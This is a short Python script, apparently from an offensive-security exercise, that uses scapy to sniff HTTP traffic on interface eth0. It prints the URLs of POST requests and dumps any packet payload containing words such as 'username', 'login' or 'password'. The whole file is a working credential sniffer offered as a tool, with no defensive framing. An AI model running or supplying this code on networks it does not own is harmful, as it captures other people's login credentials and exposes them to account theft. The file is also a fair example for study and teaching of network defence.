#!usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
def sniff(intf):
    scapy.sniff(iface=intf , store=False , prn=process)

def process(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(http.HTTPRequest):
            word = "POST"
            if word in packet[http.HTTPRequest].Method:
                url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
                print(url)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass",  "uname"]
            for key in keywords:
                if key in load:
                    print(load)
                    break




sniff("eth0")